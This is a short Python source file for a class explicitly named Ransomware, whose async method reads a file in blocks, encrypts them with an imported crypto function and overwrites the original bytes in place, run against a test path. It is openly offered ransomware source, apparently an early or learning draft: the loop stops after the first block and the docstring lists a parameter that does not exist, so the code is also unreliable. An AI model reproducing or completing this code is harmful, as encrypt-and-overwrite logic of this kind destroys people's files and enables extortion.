import asyncio
from typing import Any
import aiofiles
from Cript import crypto


class Ransomware:
    def __init__(self):
        ...

    @staticmethod
    async def crypt(file_name: str, block_size=16) -> None:
        """
        Encrypt files with block cipher
        :param file_name:
        :param crypto:
        :param block_size: Symetric crypt needs the same size of blocks
        :return:
        """
        async with aiofiles.open(file_name, 'r+b') as file:
            value = await file.read(block_size)  # read parts of file
            while value:
                cipher_value = await crypto(value)  # crypt part of file
                print(f"[*]file --> {file_name} --> ENCRYPTED")
                await file.seek(- len(value), 1)  # pointer line to overwrite the original file
                await file.write(cipher_value)  # ovewrite original file
                break


if __name__ == '__main__':
    asyncio.run(Ransomware.crypt("C:\\teste_ransomware\\tessste.txt"))